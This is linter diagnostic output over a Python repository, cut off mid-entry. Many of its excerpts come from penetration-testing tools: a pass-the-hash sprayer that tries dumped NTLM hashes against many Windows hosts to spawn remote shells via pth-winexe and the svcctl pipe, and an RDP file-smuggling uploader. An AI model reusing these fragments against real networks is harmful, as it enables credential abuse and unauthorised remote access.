UP010 [*] Unnecessary `__future__` import `print_function` for target Python version
  --> security\penetration-testing-tools\windows\pth-carpet.py:32:1
   |
30 | #
31 |
32 | from __future__ import print_function
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
33 |
34 | import argparse
   |
help: Remove unnecessary `__future__` import

F401 [*] `logging` imported but unused
  --> security\penetration-testing-tools\windows\pth-carpet.py:35:8
   |
34 | import argparse
35 | import logging
   |        ^^^^^^^
36 | import multiprocessing
37 | import os
   |
help: Remove unused import: `logging`

F401 [*] `os` imported but unused
  --> security\penetration-testing-tools\windows\pth-carpet.py:37:8
   |
35 | import logging
36 | import multiprocessing
37 | import os
   |        ^^
38 | import signal
39 | import subprocess
   |
help: Remove unused import: `os`

F401 [*] `multiprocessing.managers.BaseManager` imported but unused
  --> security\penetration-testing-tools\windows\pth-carpet.py:43:38
   |
41 | import threading
42 | from functools import partial
43 | from multiprocessing.managers import BaseManager
   |                                      ^^^^^^^^^^^
44 |
45 | from impacket.dcerpc.v5 import transport
   |
help: Remove unused import: `multiprocessing.managers.BaseManager`

UP004 [*] Class `Command` inherits from `object`
  --> security\penetration-testing-tools\windows\pth-carpet.py:70:15
   |
68 |     info(colored('[!] '+txt, 'red'))
69 |
70 | class Command(object):
   |               ^^^^^^
71 |     def __init__(self, cmd):
72 |         self.cmd = cmd
   |
help: Remove `object` inheritance

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\windows\pth-carpet.py:76:18
   |
74 |         self.output = ''
75 |         self.error = ''
76 |         verbose( '\tCalling: "%s"' % cmd)
   |                  ^^^^^^^^^^^^^^^^^^^^^^^
77 |
78 |     def get_output(self):
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\windows\pth-carpet.py:108:22
    |
107 |     if cmd_exists('pth-winexe'):
108 |         userswitch = '%s%%%s' % (username, hash)
    |                      ^^^^^^^^^^^^^^^^^^^^^^^^^^^
109 |         c = Command('pth-winexe -U %s //%s cmd' % (userswitch, host))
110 |         if c.run('exit\n', TIMEOUT):
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\windows\pth-carpet.py:109:21
    |
107 |     if cmd_exists('pth-winexe'):
108 |         userswitch = '%s%%%s' % (username, hash)
109 |         c = Command('pth-winexe -U %s //%s cmd' % (userswitch, host))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
110 |         if c.run('exit\n', TIMEOUT):
111 |             pass
    |
help: Replace with format specifiers

SIM108 Use ternary operator `errorm = error if 'NT_STATUS' in error else 'Unknown error'` instead of `if`-`else`-block
   --> security\penetration-testing-tools\windows\pth-carpet.py:120:17
    |
118 |               errorm = error[error.find('NT_STATUS'):].strip()
119 |               if not errorm.startswith('NT_STATUS'):
120 | /                 if 'NT_STATUS' in error:
121 | |                     errorm = error
122 | |                 else:
123 | |                     errorm = 'Unknown error'
    | |____________________________________________^
124 |               if OPTIONS.v:
125 |                   err('\tCould not spawn shell using PTH: ' + errorm)
    |
help: Replace `if`-`else`-block with `errorm = error if 'NT_STATUS' in error else 'Unknown error'`

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\windows\pth-carpet.py:132:21
    |
131 | def login(host, username, hash, port):
132 |     stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % host
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
133 |
134 |     rpctransport = transport.DCERPCTransportFactory(stringbinding)
    |
help: Replace with format specifiers

W605 [*] Invalid escape sequence: `\p`
   --> security\penetration-testing-tools\windows\pth-carpet.py:132:34
    |
131 | def login(host, username, hash, port):
132 |     stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % host
    |                                  ^^
133 |
134 |     rpctransport = transport.DCERPCTransportFactory(stringbinding)
    |
help: Use a raw string literal

W605 [*] Invalid escape sequence: `\s`
   --> security\penetration-testing-tools\windows\pth-carpet.py:132:39
    |
131 | def login(host, username, hash, port):
132 |     stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % host
    |                                       ^^
133 |
134 |     rpctransport = transport.DCERPCTransportFactory(stringbinding)
    |
help: Use a raw string literal

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
   --> security\penetration-testing-tools\windows\pth-carpet.py:144:12
    |
142 |         dce.connect()
143 |         return check_rce(host, username, hash, port)
144 |     except Exception, e:
    |            ^^^^^^^^^^^^
145 |         raise e
    |

F821 Undefined name `e`
   --> security\penetration-testing-tools\windows\pth-carpet.py:144:23
    |
142 |         dce.connect()
143 |         return check_rce(host, username, hash, port)
144 |     except Exception, e:
    |                       ^
145 |         raise e
    |

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\penetration-testing-tools\windows\pth-carpet.py:145:9
    |
143 |         return check_rce(host, username, hash, port)
144 |     except Exception, e:
145 |         raise e
    |         ^^^^^^^
146 |
147 | def correct_hash(hash):
    |

F821 Undefined name `e`
   --> security\penetration-testing-tools\windows\pth-carpet.py:145:15
    |
143 |         return check_rce(host, username, hash, port)
144 |     except Exception, e:
145 |         raise e
    |               ^
146 |
147 | def correct_hash(hash):
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\windows\pth-carpet.py:164:25
    |
162 |         try:
163 |             if login(machine, user, hash, OPTIONS.port):
164 |                 success('Pass-The-Hash with shell spawned: %s@%s (%s)' % (user, machine, hash))
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
165 |             else:
166 |                 if OPTIONS.v:
    |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\windows\pth-carpet.py:167:29
    |
165 |             else:
166 |                 if OPTIONS.v:
167 |                     warning('Connected using PTH but could\'nt spawn shell: %s@%s (%s)' % (user, machine, hash))
    |                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
168 |         except Exception, e:
169 |             verbose('Hash was not accepted: %s@%s (%s)\n\t%s' % (user, machine, hash, str(e)))
    |
help: Replace with format specifiers

invalid-syntax: Multiple exception types must be parenthesized on Python 3.11 (syntax was added in Python 3.14)
   --> security\penetration-testing-tools\windows\pth-carpet.py:168:16
    |
166 |                 if OPTIONS.v:
167 |                     warning('Connected using PTH but could\'nt spawn shell: %s@%s (%s)' % (user, machine, hash))
168 |         except Exception, e:
    |                ^^^^^^^^^^^^
169 |             verbose('Hash was not accepted: %s@%s (%s)\n\t%s' % (user, machine, hash, str(e)))
    |

F821 Undefined name `e`
   --> security\penetration-testing-tools\windows\pth-carpet.py:168:27
    |
166 |                 if OPTIONS.v:
167 |                     warning('Connected using PTH but could\'nt spawn shell: %s@%s (%s)' % (user, machine, hash))
168 |         except Exception, e:
    |                           ^
169 |             verbose('Hash was not accepted: %s@%s (%s)\n\t%s' % (user, machine, hash, str(e)))
    |

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\windows\pth-carpet.py:169:21
    |
167 |                     warning('Connected using PTH but could\'nt spawn shell: %s@%s (%s)' % (user, machine, hash))
168 |         except Exception, e:
169 |             verbose('Hash was not accepted: %s@%s (%s)\n\t%s' % (user, machine, hash, str(e)))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |
help: Replace with format specifiers

F821 Undefined name `e`
   --> security\penetration-testing-tools\windows\pth-carpet.py:169:91
    |
167 |                     warning('Connected using PTH but could\'nt spawn shell: %s@%s (%s)' % (user, machine, hash))
168 |         except Exception, e:
169 |             verbose('Hash was not accepted: %s@%s (%s)\n\t%s' % (user, machine, hash, str(e)))
    |                                                                                           ^
    |

W293 [*] Blank line contains whitespace
   --> security\penetration-testing-tools\windows\pth-carpet.py:170:1
    |
168 |         except Exception, e:
169 |             verbose('Hash was not accepted: %s@%s (%s)\n\t%s' % (user, machine, hash, str(e)))
170 |             
    | ^^^^^^^^^^^^
171 |
172 | def main():
    |
help: Remove whitespace from blank line

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\windows\pth-carpet.py:189:36
    |
187 |     OPTIONS = parser.parse_args()
188 |
189 |     machines = [x.strip() for x in open(OPTIONS.rhosts).readlines() ]
    |                                    ^^^^
190 |     rawpwdump = [x.strip() for x in open(OPTIONS.hashes).readlines() ]
191 |     pwdump = {}
    |

SIM115 Use a context manager for opening files
   --> security\penetration-testing-tools\windows\pth-carpet.py:190:37
    |
189 |     machines = [x.strip() for x in open(OPTIONS.rhosts).readlines() ]
190 |     rawpwdump = [x.strip() for x in open(OPTIONS.hashes).readlines() ]
    |                                     ^^^^
191 |     pwdump = {}
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\windows\pth-carpet.py:197:9
    |
195 |             user = p.split(':')[0]
196 |             hash = p.split(':')[2] + ':' + p.split(':')[3]
197 |         except:
    |         ^^^^^^
198 |             err('Supplied hashes file does not conform PWDUMP format!')
199 |             err('\tIt must be like this: <user>:<id>:<lmhash>:<nthash>:...')
    |

W293 [*] Blank line contains whitespace
   --> security\penetration-testing-tools\windows\pth-carpet.py:201:1
    |
199 |             err('\tIt must be like this: <user>:<id>:<lmhash>:<nthash>:...')
200 |             sys.exit(1)
201 |             
    | ^^^^^^^^^^^^
202 |         pwdump[user] = hash
    |
help: Remove whitespace from blank line

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\windows\pth-carpet.py:204:13
    |
202 |         pwdump[user] = hash
203 |
204 |     warning('Testing %d hashes against %d machines. Resulting in total in %d PTH attempts\n' \
    |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
205 |         % (len(pwdump), len(machines), len(pwdump) * len(machines)))
    |
help: Replace with format specifiers

W292 [*] No newline at end of file
   --> security\penetration-testing-tools\windows\pth-carpet.py:222:11
    |
221 | if __name__ == '__main__':
222 |     main()
    |           ^
    |
help: Add trailing newline

N816 Variable `outputFormats` in global scope should not be mixedCase
  --> security\penetration-testing-tools\windows\rdpFileUpload.py:66:1
   |
64 | }
65 |
66 | outputFormats = {
   | ^^^^^^^^^^^^^
67 |     "raw",
68 |     "certutil",
   |

N816 Variable `fileWasEncoded` in global scope should not be mixedCase
  --> security\penetration-testing-tools\windows\rdpFileUpload.py:71:1
   |
69 | }
70 |
71 | fileWasEncoded = False
   | ^^^^^^^^^^^^^^
72 | progressBar = None
   |

N816 Variable `progressBar` in global scope should not be mixedCase
  --> security\penetration-testing-tools\windows\rdpFileUpload.py:72:1
   |
71 | fileWasEncoded = False
72 | progressBar = None
   | ^^^^^^^^^^^
   |

UP004 [*] Class `InMemoryZip` inherits from `object`
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:107:19
    |
107 | class InMemoryZip(object):
    |                   ^^^^^^
108 |     # Source:
109 |     #   - https://www.kompato.com/post/43805938842/in-memory-zip-in-python
    |
help: Remove `object` inheritance

B007 Loop control variable `subs` not used within loop body
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:130:17
    |
128 | def fetch_files(rootdir):
129 |     imz = InMemoryZip()
130 |     for folder, subs, files in os.walk(rootdir):
    |                 ^^^^
131 |         for filename in files:
132 |             real_path = os.path.join(folder, filename)
    |
help: Rename unused `subs` to `_subs`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:158:5
    |
156 | """
157 |         )
158 |     except:
    |     ^^^^^^
159 |         pass
    |

SIM103 Return the condition `a in [10, 13, 9]` directly
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:168:5
    |
166 |           return True
167 |
168 | /     if a in [0x0A, 0x0D, 9]:
169 | |         return True
170 | |
171 | |     return False
    | |________________^
    |
help: Replace with `return a in [10, 13, 9]`

N803 Argument name `filePath` should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:174:16
    |
174 | def encodeFile(filePath, contents, dontZip):
    |                ^^^^^^^^
175 |     global fileWasEncoded
176 |     encoded = contents
    |

N803 Argument name `dontZip` should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:174:36
    |
174 | def encodeFile(filePath, contents, dontZip):
    |                                    ^^^^^^^
175 |     global fileWasEncoded
176 |     encoded = contents
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:195:5
    |
193 | """
194 |         )
195 |     except:
    |     ^^^^^^
196 |         pass
    |

N803 Argument name `chunkSize` should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:211:25
    |
211 | def splitFile(contents, chunkSize):
    |                         ^^^^^^^^^
212 |     for i in range(0, len(contents), chunkSize):
213 |         yield contents[i : i + chunkSize]
    |

N806 Variable `retypeMousePos` in function should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:232:5
    |
230 |     global progressBar
231 |
232 |     retypeMousePos = pyautogui.position()
    |     ^^^^^^^^^^^^^^
233 |     pyautogui.click()
    |

N806 Variable `prevPos` in function should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:241:9
    |
240 |     for chunk in splitFile(contents, config["chunk"]):
241 |         prevPos = pyautogui.position()
    |         ^^^^^^^
242 |
243 |         if (
    |

N806 Variable `retypeMousePos` in function should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:262:13
    |
260 |                 time.sleep(config["wait"])
261 |
262 |             retypeMousePos = pyautogui.position()
    |             ^^^^^^^^^^^^^^
263 |             pyautogui.click()
264 |             progressBar.clear()
    |

N803 Argument name `filePath` should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:278:37
    |
278 | def printInstructions(hash1, hash2, filePath):
    |                                     ^^^^^^^^
279 |     additional = ""
280 |     basename = os.path.basename(filePath)
    |

N806 Variable `inputFile` in function should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:281:5
    |
279 |     additional = ""
280 |     basename = os.path.basename(filePath)
281 |     inputFile = basename + ".txt" if fileWasEncoded else basename
    |     ^^^^^^^^^
282 |     output = basename
    |

N806 Variable `inputFile` in function should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:288:9
    |
287 |     if config["format"] == "certutil":
288 |         inputFile = basename + ".b64"
    |         ^^^^^^^^^
289 |         additional = f"""
290 |         *) Base64 decode file using certutil:
    |

N806 Variable `inputFile` in function should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:295:9
    |
294 |     elif config["format"] != "certutil" and config["base64"]:
295 |         inputFile = basename + ".b64"
    |         ^^^^^^^^^
296 |         additional = f"""
297 |         *) Base64 decode file:
    |

F541 [*] f-string without any placeholders
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:373:14
    |
371 |         choices=outputFormats,
372 |         default="raw",
373 |         help=f'Specifies into which format retype input file. Default: retype the file as is. "certutil" format implies --base64',
    |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
374 |     )
    |
help: Remove extraneous `f` prefix

N806 Variable `dontZip` in function should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:452:5
    |
451 |     contents = None
452 |     dontZip = False
    |     ^^^^^^^
453 |     t = "file"
    |

F821 Undefined name `rootdir`
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:461:36
    |
460 |         elif os.path.isdir(opts.inputFile):
461 |             contents = fetch_files(rootdir)
    |                                    ^^^^^^^
462 |
463 |             t = "directory"
    |

N806 Variable `dontZip` in function should be lowercase
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:464:13
    |
463 |             t = "directory"
464 |             dontZip = True
    |             ^^^^^^^
465 |
466 |         else:
    |

E722 Do not use bare `except`
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:472:5
    |
470 |             return False
471 |
472 |     except:
    |     ^^^^^^
473 |         Logger.err(f'Could not open file for reading: "{opts.inputFile}"')
474 |         return False
    |

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:476:20
    |
474 |         return False
475 |
476 |     if contents == None or len(contents) == 0:
    |                    ^^^^
477 |         Logger.fail("Specified file/directory was empty.")
478 |         return False
    |
help: Replace with `cond is None`

E711 Comparison to `None` should be `cond is None`
   --> security\penetration-testing-tools\windows\rdpFileUpload.py:482:19
    |
480 |     encoded = encodeFile(opts.inputFile, contents, dontZip)
481 |
482 |     if encoded == None or len(encoded) == 0:
    |                   ^^^^
483 |         Logger.fail("No encoded data to upload.")
484 |         return False
    |
help: Replace with `cond is None`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> security\triumvirate_authorization.py:15:1
   |
13 | from datetime import datetime
14 | from enum import Enum
15 | from typing import Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
16 |
17 | logger = logging.getLogger("TriumvirateAuth")
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> security\triumvirate_authorization.py:15:1
   |
13 | from datetime import datetime
14 | from enum import Enum
15 | from typing import Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
16 |
17 | logger = logging.getLogger("TriumvirateAuth")
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> security\triumvirate_authorization.py:15:1
   |
13 | from datetime import datetime
14 | from enum import Enum
15 | from typing import Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
16 |
17 | logger = logging.getLogger("TriumvirateAuth")
   |

UP006 [*] Use `list` instead of `List` for type annotation
  --> security\triumvirate_authorization.py:62:65
   |
60 |     """Triumvirate's decision on tool authorization"""
61 |
62 |     def __init__(self, approved: bool, reason: str, conditions: List[str] = None):
   |                                                                 ^^^^
63 |         self.approved = approved
64 |         self.reason = reason
   |
help: Replace with `list`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> security\triumvirate_authorization.py:96:10
   |
94 |     def request_authorization(
95 |         self, request: ToolAuthorizationRequest
96 |     ) -> Tuple[bool, str, Optional[str]]:
   |          ^^^^^
97 |         """
98 |         Request authorization from Triumvirate
   |
help: Replace with `tuple`

UP045 [*] Use `X | None` for type annotations
  --> security\triumvirate_authorization.py:96:27
   |
94 |     def request_authorization(
95 |         self, request: ToolAuthorizationRequest
96 |     ) -> Tuple[bool, str, Optional[str]]:
   |                           ^^^^^^^^^^^^^
97 |         """
98 |         Request authorization from Triumvirate
   |
help: Convert to `X | None`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\triumvirate_authorization.py:160:17
    |
159 |               for scenario, required_level in self.AUTO_APPROVE_SCENARIOS.items():
160 | /                 if scenario.replace("_", " ") in justification_lower:
161 | |                     if request.threat_level.value >= required_level.value:
    | |__________________________________________________________________________^
162 |                           return True
    |
help: Combine `if` statements using `and`

UP006 [*] Use `list` instead of `List` for type annotation
   --> security\triumvirate_authorization.py:290:56
    |
288 |             f.write(json.dumps(log_entry) + "\n")
289 |
290 |     def get_decision_history(self, limit: int = 50) -> List[Dict]:
    |                                                        ^^^^
291 |         """Get recent Triumvirate decisions"""
292 |         return self.decision_history[-limit:]
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> security\triumvirate_authorization.py:290:61
    |
288 |             f.write(json.dumps(log_entry) + "\n")
289 |
290 |     def get_decision_history(self, limit: int = 50) -> List[Dict]:
    |                                                             ^^^^
291 |         """Get recent Triumvirate decisions"""
292 |         return self.decision_history[-limit:]
    |
help: Replace with `dict`

F401 [*] `hmac` imported but unused
  --> security\vault_access_control.py:10:8
   |
 9 | import hashlib
10 | import hmac
   |        ^^^^
11 | import json
12 | import logging
   |
help: Remove unused import: `hmac`

F401 [*] `json` imported but unused
  --> security\vault_access_control.py:11:8
   |
 9 | import hashlib
10 | import hmac
11 | import json
   |        ^^^^
12 | import logging
13 | import os
   |
help: Remove unused import: `json`

F401 [*] `os` imported but unused
  --> security\vault_access_control.py:13:8
   |
11 | import json
12 | import logging
13 | import os
   |        ^^
14 | import time
15 | from datetime import datetime
   |
help: Remove unused import: `os`

F401 [*] `datetime.datetime` imported but unused
  --> security\vault_access_control.py:15:22
   |
13 | import os
14 | import time
15 | from datetime import datetime
   |                      ^^^^^^^^
16 | from pathlib import Path
17 | from typing import Dict, List, Optional
   |
help: Remove unused import: `datetime.datetime`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> security\vault_access_control.py:17:1
   |
15 | from datetime import datetime
16 | from pathlib import Path
17 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | # Configure audit logging
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> security\vault_access_control.py:17:1
   |
15 | from datetime import datetime
16 | from pathlib import Path
17 | from typing import Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
18 |
19 | # Configure audit logging
   |

F401 [*] `typing.Optional` imported but unused
  --> security\vault_access_control.py:17:32
   |
15 | from datetime import datetime
16 | from pathlib import Path
17 | from typing import Dict, List, Optional
   |                                ^^^^^^^^
18 |
19 | # Configure audit logging
   |
help: Remove unused import: `typing.Optional`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> security\vault_access_control.py:75:10
   |
73 |     def authenticate(
74 |         self, user_id: str, role: str, auth_token: str, justification: str = ""
75 |     ) -> Dict:
   |          ^^^^
76 |         """
77 |         Authenticate user for vault access
   |
help: Replace with `dict`

F541 [*] f-string without any placeholders
   --> security\vault_access_control.py:114:26
    |
112 |         # Require justification
113 |         if not justification or len(justification) < 20:
114 |             logger.error(f"VAULT ACCESS DENIED - Insufficient justification")
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
115 |             self._log_failed_attempt(user_id, "No justification")
116 |             raise AccessDeniedError("Valid justification required (min 20 chars)")
    |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> security\vault_access_control.py:176:26
    |
174 |         """
175 |         if not self.validate_session(session_token):
176 |             logger.error(f"TOOL ACCESS DENIED - Invalid session")
    |                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
177 |             raise AccessDeniedError("Invalid or expired session")
    |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> security\vault_access_control.py:221:25
    |
219 |         Requires SECURITY_ADMIN token
220 |         """
221 |         logger.critical(f"VAULT ACTIVATION ATTEMPT")
    |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
222 |
223 |         if not self._validate_admin_token(admin_token):
    |
help: Remove extraneous `f` prefix

UP006 [*] Use `list` instead of `List` for type annotation
   --> security\vault_access_control.py:247:68
    |
245 |         return len(token) >= 64
246 |
247 |     def get_audit_log(self, admin_token: str, limit: int = 100) -> List[Dict]:
    |                                                                    ^^^^
248 |         """Retrieve audit log (admin only)"""
249 |         if not self._validate_admin_token(admin_token):
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> security\vault_access_control.py:247:73
    |
245 |         return len(token) >= 64
246 |
247 |     def get_audit_log(self, admin_token: str, limit: int = 100) -> List[Dict]:
    |                                                                         ^^^^
248 |         """Retrieve audit log (admin only)"""
249 |         if not self._validate_admin_token(admin_token):
    |
help: Replace with `dict`

UP015 [*] Unnecessary mode argument
   --> security\vault_access_control.py:256:40
    |
255 |         if self.ACCESS_LOG.exists():
256 |             with open(self.ACCESS_LOG, "r") as f:
    |                                        ^^^
257 |                 lines = f.readlines()[-limit:]
258 |                 for line in lines:
    |
help: Remove mode argument

F401 [*] `math` imported but unused
  --> src\app\agents\alpha_red.py:17:8
   |
16 | import logging
17 | import math
   |        ^^^^
18 | import random
19 | from datetime import datetime
   |
help: Remove unused import: `math`

F821 Undefined name `torch`
   --> src\app\agents\codex_deus_maximus.py:237:14
    |
235 |         inputs = self._gpt_tokenizer(prompt, return_tensors="pt")
236 |         inputs = {k: v.to(self._gpt_model.device) for k, v in inputs.items()}
237 |         with torch.no_grad():
    |              ^^^^^
238 |             output = self._gpt_model.generate(
239 |                 **inputs,
    |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\agents\constitutional_guardrail_agent.py:321:13
    |
319 |           elif principle.id == "transparency":
320 |               uncertain_claims = ["definitely", "certainly", "always", "never"]
321 | /             if any(claim in response_lower for claim in uncertain_claims):
322 | |                 # Check if response makes absolute claims without caveats
323 | |                 if "may" not in response_lower and "might" not in response_lower:
    | |_________________________________________________________________________________^
324 |                       return Violation(
325 |                           principle_id=principle.id,
    |
help: Combine `if` statements using `and`

F541 [*] f-string without any placeholders
   --> src\app\cli.py:724:20
    |
722 |             f"  Four Laws framework: {'Γ£ô Active' if result.get('allowed', False) else 'ΓÜá Restricted'}"
723 |         )
724 |         typer.echo(f"  Humanity-first principle: Active")
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
725 |         typer.echo(f"  System version: {__version__}")
    |
help: Remove extraneous `f` prefix

F401 `sys` imported but unused
  --> src\app\cli\__init__.py:22:8
   |
21 | import importlib.metadata as _meta
22 | import sys
   |        ^^^
23 |
24 | import typer
   |
help: Remove unused import: `sys`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\advanced_behavioral_validation.py:162:9
    |
161 |           # Second Law - disobedience
162 | /         if context.get("human_order", False) and not action.get("obeys", True):
163 | |             if not context.get("conflicts_first_law", False):
    | |_____________________________________________________________^
164 |                   return (
165 |                       True,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\advanced_behavioral_validation.py:171:9
    |
170 |           # Third Law - self-preservation
171 | /         if action.get("self_destruct", False):
172 | |             if not context.get("protects_human", False):
    | |________________________________________________________^
173 |                   return (
174 |                       True,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\advanced_boot.py:313:13
    |
311 |           if not self._current_profile_config:
312 |               # No profile set, check emergency mode only
313 | /             if self._emergency_mode_active:
314 | |                 if subsystem_id not in self.EMERGENCY_CRITICAL_SUBSYSTEMS:
    | |__________________________________________________________________________^
315 |                       return False, "Emergency mode active - non-critical subsystem"
316 |               return True, None
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\advanced_boot.py:321:9
    |
320 |           # Emergency mode check (highest priority)
321 | /         if self._emergency_mode_active:
322 | |             if subsystem_id not in self.EMERGENCY_CRITICAL_SUBSYSTEMS:
    | |______________________________________________________________________^
323 |                   return False, "Emergency mode active - non-critical subsystem"
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\advanced_boot.py:326:9
    |
325 |           # Check whitelist
326 | /         if config.subsystem_whitelist is not None:
327 | |             if subsystem_id not in config.subsystem_whitelist:
    | |______________________________________________________________^
328 |                   return (
329 |                       False,
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\advanced_boot.py:338:9
    |
337 |           # Ethics-first check
338 | /         if config.require_ethics_approval:
339 | |             if subsystem_id not in self.ETHICS_PRIORITY_SUBSYSTEMS:
    | |___________________________________________________________________^
340 |                   if not self._ethics_checkpoint_passed:
341 |                       return False, "Waiting for ethics checkpoint"
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\advanced_boot.py:823:13
    |
821 |                   )
822 |
823 | /             elif event.event_type == "state_snapshot":
824 | |                 if event.state_snapshot:
    | |________________________________________^
825 |                       reconstructed_state["state_snapshots"].append(event.state_snapshot)
    |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> src\app\core\ai_systems.py:363:9
    |
362 |           # Legion specific limits: Cannot initiate Genesis
363 | /         if context.get("entity_class") == EntityClass.APPOINTED.value:
364 | |             if action == "initiate_genesis":
    | |____________________________________________^
365 |                   return (
366 |                       False,
    |
help: Combine `if` statements using `and`

N806 Variable `X_train` in function should be lowercase
   --> src\app\core\cbrn_classifier.py:201:9
    |
200 |         # Combine examples
201 |         X_train = (
    |         ^^^^^^^
202 |             self.HARMFUL_EXAMPLES + self.SAFE_EXAMPLES
203 |         )  # noqa: N806 - ML convention
    |

N806 Variable `X_vec` in function should be lowercase
   --> src\app\core\cbrn_classifier.py:261:13
    |
260 |         if ML_AVAILABLE and self.model is not None:
261 |             X_vec = self.vectorizer.transform(
    |             ^^^^^
262 |                 [input_text]
263 |             )  # noqa: N806 - ML convention
    |

F401 [*] `os` imported but unused
  --> src\app\core\config_loader.py:21:8
   |
19 | import json
20 | import logging
21 | import os
   |        ^^
22 | import shutil
23 | import threading
   |
help: Remove unused import: `os`

UP035 [*] Import from `collections.abc` instead: `Callable`
  --> src\app\core\config_loader.py:28:1
   |
26 | from datetime import datetime
27 | from pathlib import Path
28 | from typing import Any, Callable, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
29 |
30 | import yaml
   |
help: Import from `collections.abc`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> src\app\core\config_loader.py:28:1
   |
